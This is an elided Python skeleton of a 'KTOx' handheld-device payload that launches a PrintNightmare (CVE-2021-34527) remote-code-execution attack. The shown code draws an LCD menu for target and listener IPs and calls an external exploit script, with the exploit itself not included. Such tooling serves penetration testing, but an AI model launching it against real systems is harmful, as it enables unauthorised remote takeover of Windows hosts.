#!/usr/bin/env python3
"""
KTOx *payload* – **PrintNightmare Attack**
===============================================
This payload performs a PrintNightmare attack (CVE-2021-34527) against a
...
Features:
- Exploits the vulnerability to gain remote code execution.
...
def draw_ui(screen_state="main", message_lines=None):
    ...
    d.text((5, 5), "PrintNightmare Attack", font=FONT_TITLE, fill=(30, 132, 73))
    ...
    if message_lines:
        ...
        d.text((5, 30), f"Target: {TARGET_IP}", font=FONT, fill=(242, 243, 244))
        d.text((5, 50), f"Listener: {LISTENER_IP}", font=FONT, fill=(242, 243, 244))
        d.text((5, 100), "OK=Attack", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY1=Target | KEY2=Listener", font=FONT, fill=(171, 178, 185))
    elif screen_state == "attacking":
        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 70), f"Target: {TARGET_IP}", font=FONT, fill=(242, 243, 244))
        d.text((5, 85), f"Listener: {LISTENER_IP}", font=FONT, fill=(242, 243, 244))
...
def run_attack():
    ...
    # Path to PrintNightmare exploit
    printnightmare_path = os.path.join(KTOX_ROOT, "printnightmare-exploit", "printnightmare.py")
...
if __name__ == "__main__":
    try:
        ...
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("PrintNightmare Attack payload finished.")
